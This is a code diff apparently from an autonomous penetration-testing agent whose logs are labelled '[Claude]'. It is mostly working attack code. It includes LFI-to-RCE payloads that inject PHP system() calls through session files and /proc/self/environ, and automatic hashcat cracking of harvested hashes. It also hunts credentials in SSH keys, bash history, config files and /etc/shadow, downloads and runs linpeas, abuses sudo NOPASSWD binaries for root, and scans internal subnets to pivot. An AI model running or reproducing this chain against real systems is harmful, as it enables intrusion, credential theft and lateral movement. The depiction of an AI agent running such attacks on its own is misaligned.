+                    "description": f"LFI en {lfi_url} (param={lfi_param}) + log poisoning via {log_path} → ejecución de comandos.\nEvidencia: {lfi_test[:200]}",
+                    "cve": "",
+                }], target)
+                break
+
+        # ── 2. PHP session file include ───────────────────────────────────
+        self._log(f"[Claude] LFI→RCE: PHP session include attempt")
+        sess_out, _ = self._run_cmd(
+            "lfi-session-inject",
+            f"# Set PHP session with payload\n"
+            f"SESSID=$(curl -s --max-time 10 -c /tmp/lfi_cookie_{target.replace('.','_')} '{base_url}/' 2>/dev/null | "
+            f"grep -oP 'PHPSESSID=[a-z0-9]+' | head -1 | cut -d= -f2); "
+            f"[ -z \"$SESSID\" ] && SESSID=$(python3 -c 'import os; print(os.urandom(16).hex())' 2>/dev/null); "
+            f"curl -s --max-time 10 -H 'Cookie: PHPSESSID='$SESSID "
+            f"'{base_url}/?input=<?php system(\\$_GET[\\\"cmd\\\"]); ?>' 2>/dev/null | head -3; "
+            f"# Try to include /var/lib/php/sessions/sess_$SESSID\n"
+            f"curl -s --max-time 10 -H 'Cookie: PHPSESSID='$SESSID "
+            f"'{lfi_url}?{lfi_param}=/var/lib/php/sessions/sess_'$SESSID'&cmd=id' 2>/dev/null | grep 'uid=' | head -2; "
+            f"curl -s --max-time 10 -H 'Cookie: PHPSESSID='$SESSID "
+            f"'{lfi_url}?{lfi_param}=/tmp/sess_'$SESSID'&cmd=id' 2>/dev/null | grep 'uid=' | head -2",
+            target, timeout=30,
+        )
+        if "uid=" in sess_out:
+            self._capture_evidence(sess_out, target, "lfi-session-rce", "LFI→PHP session")
+            results.append(f"=== LFI PHP Session RCE ===\n{sess_out[:400]}")
+            self._save_findings([{
+                "title": f"LFI → PHP Session Injection → RCE @ {target}:{port}",
+                "severity": "critical",
+                "description": f"LFI + inyección en sesión PHP → RCE. {sess_out[:200]}",
+                "cve": "",
+            }], target)
+
+        # ── 3. /proc/self/environ injection ──────────────────────────────
+        environ_out, _ = self._run_cmd(
+            "lfi-environ-rce",
+            f"curl -s --max-time 10 "
+            f"-A '<?php system(\\$_GET[\"cmd\"]); ?>'"
+            f"'{lfi_url}?{lfi_param}=/proc/self/environ&cmd=id' 2>/dev/null | grep 'uid=' | head -2",
+            target, timeout=15,
+        )
+        if "uid=" in environ_out:
+            self._capture_evidence(environ_out, target, "lfi-environ-rce", "LFI→/proc/self/environ")
+            results.append(f"=== LFI /proc/self/environ RCE ===\n{environ_out[:300]}")
+            self._save_findings([{
+                "title": f"LFI → /proc/self/environ → RCE @ {target}:{port}",
+                "severity": "critical",
+                "description": f"LFI + HTTP_USER_AGENT PHP injection via /proc/self/environ → RCE.",
+                "cve": "",
+            }], target)
+
+        if results:
+            accumulated_output.extend(results)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Feature 4: Auto hashcat when hashes found
+    # ─────────────────────────────────────────────────────────────────────────
+    def _auto_crack_hashes(self, output_text, target, accumulated_output):
+        """Detect hash types in output and launch hashcat with rockyou.txt."""
+        # Hash format → (hashcat mode, name)
+        HASH_PATTERNS = [
+            (r'\$6\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{86}', 1800, "sha512crypt"),
+            (r'\$5\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{43}', 7400, "sha256crypt"),
+            (r'\$1\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{22}', 500,  "md5crypt"),
+            (r'\$2[aby]\$\d+\$[a-zA-Z0-9./]{53}', 3200, "bcrypt"),
+            (r'[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', 1000, "NTLM"),
+            (r'[a-fA-F0-9]{32}(?:[^:]|$)', 0, "MD5"),
+            (r'[a-fA-F0-9]{40}(?:[^:]|$)', 100, "SHA1"),
+            (r'[a-fA-F0-9]{64}(?:[^:]|$)', 1400, "SHA256"),
+            (r'aad3b435b51404eeaad3b435b51404ee:[a-fA-F0-9]{32}', 1000, "NTLM-empty-LM"),
+        ]
+
+        found_hashes = {}
+        for pattern, mode, name in HASH_PATTERNS:
+            matches = re.findall(pattern, output_text)
+            if matches:
+                for h in matches[:5]:  # max 5 per type
+                    h = h.strip()
+                    if len(h) > 8:
+                        found_hashes.setdefault(name, (mode, []))[1].append(h)
+
+        if not found_hashes:
+            return
+
+        self._log(f"[Claude] HASHCAT: encontrados {len(found_hashes)} tipos de hashes → crackeando")
+        rockyou_paths = ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz",
+                         "/opt/rockyou.txt", "/home/kali/rockyou.txt"]
+
+        rockyou = next((p for p in rockyou_paths if __import__('os').path.exists(p)), None)
+        if not rockyou:
+            self._log(f"[Claude] HASHCAT: rockyou.txt no encontrado, saltando")
+            return
+
+        # Decompress if gzipped
+        if rockyou.endswith(".gz"):
+            self._run_cmd("decompress-rockyou",
+                          f"gunzip -k {rockyou} 2>/dev/null; ls /usr/share/wordlists/rockyou.txt",
+                          target, timeout=30)
+            rockyou = rockyou[:-3]
+
+        for name, (mode, hashes) in found_hashes.items():
+            hash_file = f"/tmp/hashes_{target.replace('.','_')}_{name}.txt"
+            with open(hash_file, "w") as hf:
+                hf.write("\n".join(dict.fromkeys(hashes)))
+            self._log(f"[Claude] HASHCAT: cracking {len(hashes)} hashes {name} (mode {mode})")
+            crack_out, _ = self._run_cmd(
+                f"hashcat-{name}",
+                f"hashcat -a 0 -m {mode} --force --quiet "
+                f"--potfile-path /tmp/hashcat_{target.replace('.','_')}.pot "
+                f"-r /usr/share/hashcat/rules/best64.rule 2>/dev/null "
+                f"{hash_file} {rockyou} 2>/dev/null | tail -20; "
+                f"hashcat -m {mode} --force --quiet --show "
+                f"--potfile-path /tmp/hashcat_{target.replace('.','_')}.pot "
+                f"{hash_file} 2>/dev/null | head -10",
+                target, timeout=300,  # 5 minutes max per hash type
+            )
+            cracked = re.findall(r'([a-fA-F0-9$./]{20,}):(\S+)', crack_out)
+            if cracked:
+                self._log(f"[Claude] HASHCAT: {len(cracked)} contraseñas crackeadas: {[c[1] for c in cracked[:3]]}")
+                accumulated_output.append(f"=== Hashes Crackeados ({name}) ===\n{crack_out[:600]}")
+                for hash_val, plain in cracked[:5]:
+                    MEMORY.remember_cred(target, "cracked", hash_val[:20], plain)
+                self._save_findings([{
+                    "title": f"Contraseñas Crackeadas ({name}) @ {target}",
+                    "severity": "high",
+                    "description": f"{len(cracked)} hashes {name} crackeados con rockyou.txt:\n" +
+                                   "\n".join(f"  {h[:20]}... → {p}" for h, p in cracked[:5]),
+                    "cve": "",
+                }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Feature 2 + 5: Full post-exploitation chain (with Linpeas)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _post_exploit_chain(self, target, user, pwd, accumulated_output):
+        """
+        Full post-exploitation orchestrator after gaining SSH access.
+        1. Basic enumeration (id, uname, network, flags)
+        2. Linpeas auto-run + parse output
+        3. Kernel privesc check
+        4. Linux local privesc (cron, caps, docker)
+        5. Hash extraction + cracking
+        6. Credential hunting (SSH keys, config files, .bash_history)
+        """
+        self._log(f"[Claude] POST-EXPLOIT: iniciando cadena completa → {target} ({user})")
+
+        def ssh_exec(cmd, label, timeout=60):
+            full = (
+                f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null"
+            )
+            out, _ = self._run_cmd(label, full, target, timeout=timeout)
+            return out
+
+        def scp_put(local_path, remote_path, label):
+            full = (
+                f"sshpass -p '{pwd}' scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                f"{local_path} {user}@{target}:{remote_path} 2>/dev/null"
+            )
+            self._run_cmd(label, full, target, timeout=30)
+
+        # ── Step 1: Basic enumeration ─────────────────────────────────────
+        basic = ssh_exec(
+            "id; whoami; hostname; uname -a; "
+            "cat /etc/os-release 2>/dev/null | head -5; "
+            "ip a 2>/dev/null | grep 'inet ' | head -5; "
+            "netstat -tulpn 2>/dev/null | head -15 || ss -tulpn 2>/dev/null | head -15; "
+            "ps aux 2>/dev/null | head -20; "
+            "cat /etc/passwd | grep -v 'nologin\\|false' | head -15; "
+            "sudo -l 2>/dev/null | head -20; "
+            "find / -perm -4000 -type f 2>/dev/null | head -20; "
+            "cat ~/user.txt ~/flag.txt 2>/dev/null; "
+            "find /home -name 'user.txt' -o -name 'flag.txt' 2>/dev/null | head -5 | xargs cat 2>/dev/null",
+            "post-exploit-enum", timeout=60,
+        )
+        accumulated_output.append(f"=== POST-EXPLOIT Basic Enum {target} ({user}) ===\n{basic[:1200]}")
+        self._capture_evidence(basic, target, "post-exploit-enum", f"ssh {user}@{target}")
+
+        # Extract kernel version
+        kernel_match = re.search(r'Linux\s+\S+\s+([\d.]+)', basic)
+        kernel_ver = kernel_match.group(1) if kernel_match else ""
+
+        # ── Step 2: Credential hunting ────────────────────────────────────
+        creds_hunt = ssh_exec(
+            "# Bash history\n"
+            "cat ~/.bash_history 2>/dev/null | grep -iE 'password|passwd|pass|secret|key|token|mysql|ssh' | head -20; "
+            "# SSH private keys\n"
+            "find /home /root ~/.ssh 2>/dev/null -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | "
+            "xargs ls -la 2>/dev/null | head -10; "
+            "cat ~/.ssh/id_rsa 2>/dev/null | head -20; "
+            "# Config files with passwords\n"
+            "grep -rE 'password[[:space:]]*=|passwd[[:space:]]*=|DB_PASS|db_password' "
+            "/var/www/html /opt /srv /home 2>/dev/null --include='*.php' --include='*.conf' --include='*.env' "
+            "--include='*.ini' --include='*.yaml' --include='*.yml' -l 2>/dev/null | head -10 | "
+            "xargs grep -hE 'password|passwd|DB_PASS' 2>/dev/null | grep -v '#' | head -20; "
+            "# Shadow file (if root)\n"
+            "cat /etc/shadow 2>/dev/null | head -20",
+            "post-cred-hunt", timeout=60,
+        )
+        accumulated_output.append(f"=== POST-EXPLOIT Creds Hunt ===\n{creds_hunt[:800]}")
+        self._auto_crack_hashes(creds_hunt, target, accumulated_output)
+
+        # ── Step 3: Linpeas ───────────────────────────────────────────────
+        self._log(f"[Claude] POST-EXPLOIT: ejecutando linpeas @ {target}")
+        linpeas_out = ssh_exec(
+            "# Download and run linpeas\n"
+            "LINPEAS_URL='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'; "
+            "if command -v curl &>/dev/null; then "
+            "  curl -sL --max-time 30 $LINPEAS_URL -o /tmp/linpeas.sh 2>/dev/null; "
+            "elif command -v wget &>/dev/null; then "
+            "  wget -qO /tmp/linpeas.sh --timeout=30 $LINPEAS_URL 2>/dev/null; "
+            "fi; "
+            "chmod +x /tmp/linpeas.sh 2>/dev/null && "
+            "timeout 120 /tmp/linpeas.sh -q 2>/dev/null | "
+            "grep -E 'CVE-|SUID|sudo|capabilities|writable|password|NOPASSWD|docker|lxd|99%|95%' | "
+            "head -60",
+            "linpeas-run", timeout=150,
+        )
+        if linpeas_out.strip():
+            accumulated_output.append(f"=== Linpeas Output ({target}) ===\n{linpeas_out[:2000]}")
+            # Parse CVEs from linpeas output
+            cves_found = re.findall(r'CVE-\d{4}-\d+', linpeas_out)
+            cves_unique = list(dict.fromkeys(cves_found))[:10]
+            if cves_unique:
+                self._log(f"[Claude] Linpeas sugiere CVEs: {cves_unique}")
+                self._save_findings([{
+                    "title": f"Linpeas: CVEs Detectados en Sistema Local @ {target}",
+                    "severity": "high",
+                    "description": f"Linpeas detectó posibles CVEs en sistema local: {', '.join(cves_unique)}\n"
+                                   f"Detalles:\n{linpeas_out[:500]}",
+                    "cve": cves_unique[0] if cves_unique else "",
+                }], target)
+
+            # Parse NOPASSWD sudo entries
+            nopasswd = re.findall(r'NOPASSWD[^\\n]*', linpeas_out)
+            for sudo_entry in nopasswd[:3]:
+                sudo_bin = re.search(r'(/[^\s,)]+)', sudo_entry)
+                if sudo_bin:
+                    bin_name = sudo_bin.group(1).split("/")[-1].lower()
+                    self._log(f"[Claude] POST-EXPLOIT: sudo NOPASSWD → {sudo_bin.group(1)}")
+                    sudo_gtfo = {
+                        "find": f"sudo find . -exec /bin/sh \\; 2>/dev/null; sudo find / -name '*.txt' -exec cat {{}} \\; 2>/dev/null | grep -i 'flag\\|root' | head -5",
+                        "vim": f"sudo vim -c ':!id>/tmp/sudo_proof.txt' -c ':q' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                        "nano": f"sudo nano /etc/sudoers 2>/dev/null | head -5; sudo nano /root/root.txt 2>/dev/null | head -3",
+                        "python3": f"sudo python3 -c 'import os; os.system(\"id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null\")' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                        "python": f"sudo python -c 'import os; os.system(\"id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null\")' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                        "perl": f"sudo perl -e 'system(\"id>/tmp/sudo_proof.txt\")' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                        "bash": f"sudo bash -c 'id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                        "less": f"sudo less /etc/shadow 2>/dev/null | head -5 >/tmp/sudo_proof.txt; cat /tmp/sudo_proof.txt",
+                        "more": f"sudo more /etc/shadow 2>/dev/null | head -5 >/tmp/sudo_proof.txt; cat /tmp/sudo_proof.txt",
+                        "awk": f"sudo awk 'BEGIN {{system(\"id>/tmp/sudo_proof.txt\")}}' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                        "nmap": f"echo 'os.execute(\"/bin/sh\")' > /tmp/nmap_priv.nse && sudo nmap --script /tmp/nmap_priv.nse localhost 2>/dev/null | head -5",
+                        "tcpdump": f"sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/privesc_tcpdump.sh 2>/dev/null & sleep 2",
+                        "git": f"sudo git help config --exec-path 2>/dev/null; sudo git -p help 2>/dev/null | head -3",
+                        "env": f"sudo env /bin/bash 2>/dev/null -c 'id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null'; cat /tmp/sudo_proof.txt",
+                        "tar": f"sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \"id>/tmp/sudo_proof.txt\"' 2>/dev/null; cat /tmp/sudo_proof.txt",
+                    }
+                    gtfo_cmd = sudo_gtfo.get(bin_name, f"sudo {sudo_bin.group(1)} --help 2>/dev/null | head -3")
+                    sudo_out = ssh_exec(gtfo_cmd, f"sudo-gtfo-{bin_name}", timeout=30)
+                    self._capture_evidence(sudo_out, target, f"sudo-gtfo-{bin_name}", f"sudo NOPASSWD {sudo_bin.group(1)}")
+                    accumulated_output.append(f"=== Sudo NOPASSWD {sudo_bin.group(1)} ===\n{sudo_out[:400]}")
+                    self._save_findings([{
+                        "title": f"Sudo NOPASSWD Privesc: {sudo_bin.group(1)} @ {target}",
+                        "severity": "critical",
+                        "description": f"Usuario {user} puede ejecutar {sudo_bin.group(1)} como root sin contraseña → escalada.\n{sudo_out[:200]}",
+                        "cve": "",
+                    }], target)
+
+        # ── Step 4: Kernel + local privesc ────────────────────────────────
+        if kernel_ver:
+            self._kernel_privesc(target, user, pwd, kernel_ver, accumulated_output)
+        self._linux_local_privesc(target, user, pwd, accumulated_output)
+
+        # ── Step 5: Network discovery for pivoting ────────────────────────
+        net_disc = ssh_exec(
+            "ip route 2>/dev/null; "
+            "cat /etc/hosts 2>/dev/null; "
+            "# Quick internal subnet scan\n"
+            "IFACE_IP=$(ip a 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1); "
+            "SUBNET=$(echo $IFACE_IP | sed 's|\\.[0-9]*/.*|.0/24|'); "
+            "echo \"Internal network: $SUBNET\"; "
+            "command -v nmap &>/dev/null && nmap -T4 --open -p 22,80,443,445,3389 $SUBNET 2>/dev/null | "
+            "grep -E 'Nmap scan|open|Host is up' | head -30 || "
+            "for i in $(seq 1 254); do "
+            "  (ping -c1 -W1 $(echo $SUBNET | sed 's|0/24||')$i &>/dev/null && "
+            "   echo \"UP: $(echo $SUBNET | sed 's|0/24||')$i\") & "
+            "done; wait 2>/dev/null | head -20",
+            "post-net-discovery", timeout=90,
+        )
+        accumulated_output.append(f"=== POST-EXPLOIT Network Discovery ===\n{net_disc[:800]}")
+        # Extract new targets
+        new_ips = re.findall(r'(?:UP|open):[^\d]*(\d+\.\d+\.\d+\.\d+)', net_disc)
+        if new_ips:
+            self._log(f"[Claude] POST-EXPLOIT: redes internas descubiertas: {new_ips[:5]}")
+            self._save_findings([{
+                "title": f"Pivoting: Hosts Internos Descubiertos @ {target}",
+                "severity": "medium",
+                "description": f"Desde {target} se ven {len(new_ips)} hosts internos: {', '.join(new_ips[:10])}",
+                "cve": "",
+            }], target)
 
     def _loop_target(self, target):
         self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
